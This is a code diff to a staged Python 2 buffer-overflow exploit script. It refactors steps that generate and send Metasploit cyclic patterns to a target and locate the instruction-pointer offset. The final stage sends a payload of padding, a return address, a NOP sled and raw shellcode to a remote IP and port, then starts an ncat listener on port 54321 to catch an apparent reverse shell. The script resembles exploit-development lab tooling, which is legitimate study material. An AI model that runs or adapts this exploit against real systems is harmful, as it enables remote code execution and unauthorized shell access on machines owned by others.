@@ -8,7 +8,7 @@
 import sys
 import socket
 from time import sleep
-from subprocess import call
+import subprocess
 import struct
 import argparse
 parser = argparse.ArgumentParser(prog="bof")
@@ -19,6 +19,9 @@ parser.add_argument('--bytes', type=int, help='Bytes to send before payload')
 parser.add_argument('--address', type=str, help='Return address')
 parser.add_argument('--nops', type=int, help='nopsled')
 args = vars(parser.parse_args())
+if args["stage"] == None:
+	parser.print_help()
+	sys.exit()
 args = { k: args[k] for k in args if args[k] != None }
 if args["stage"] == 1:
 	if any(k not in args for k in {"ip", "port", "bytes"}):
@@ -45,14 +48,14 @@ elif args["stage"] == 2:
 		parser.print_help()
 		sys.exit()
 	try:
-		pattern = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", args["bytes"]], stdout=subprocess.PIPE)
-		payload = pattern.stdout.read()
 		print "[*] Connecting to {}...".format(args["ip"])
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((args["ip"], args["port"]))
 		banner = s.recv(1024)
 		print "[x] Connected to {}".format(banner)
 		print "[*] Sending payload..."
+		pattern = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(args["bytes"])], stdout=subprocess.PIPE)
+		payload = pattern.stdout.read()
 		s.send(payload)
 		s.close()
 		print "[x] Payload delivered, check your debugger to read the value of the instruction pointer" 
@@ -63,8 +66,8 @@ elif args["stage"] == 3:
 		parser.print_help()
 		sys.exit()
 	try:
-		offset = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", ADDRESS], stdout=subprocess.PIPE)
-		output = OFFSET.stdout.read()
+		offset = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", args["address"]], stdout=subprocess.PIPE)
+		output = offset.stdout.read()
 		print "[x] {}".format(output)
 	except:
 		print "[!] Unable to get offset"
@@ -110,25 +113,25 @@ elif args["stage"] == 5:
 	shellcode += "\x18\x9b\x9f\x17\x18\xc6\x1f\xc2\x5f\xff\xa3\xe6"
 	shellcode += "\x1f\x04\xbb\x83\x1a\x40\x7b\x78\x57\xd9\xee\x7e"
 	shellcode += "\xc4\xda\x3a"
-	PAYLOAD = "A" * args["bytes"] + return_addr + nopsled + shellcode
+	payload = "A" * args["bytes"] + return_addr + nopsled + shellcode
+	#try:
+	print "[*] Connecting to {}...".format(args["ip"])
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((args["ip"], args["port"]))
+	banner = s.recv(1024)
+	print "[x] Connected to {}".format(banner)
+	print "[*] Sending payload..."
+	s.send(payload)
+	s.close()
+	print "[x] Payload delivered"
+	print "[*] Waiting for target to connect"
 	try:
-		print "[*] Connecting to {}...".format(HOST)
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((HOST, int(PORT)))
-		BANNER = s.recv(1024)
-		print "[x] Connected to {}".format(BANNER)
-		print "[*] Sending payload..."
-		s.send(PAYLOAD)
-		s.close()
-		print "[x] Payload delivered"
-		print "[*] Waiting for target to connect"
-		try:
-			sleep(1)
-			call(["ncat", "-vlnp", "54321"])
-		except:
-			print "[!] Payload failed"
+		sleep(1)
+		subprocess.call(["ncat", "-vlnp", "54321"])
 	except:
-		print "[!] Connection failed"
+		print "[!] Payload failed"
+	#except:
+	#	print "[!] Connection failed"
 else:
 	parser.print_help()
 	sys.exit()
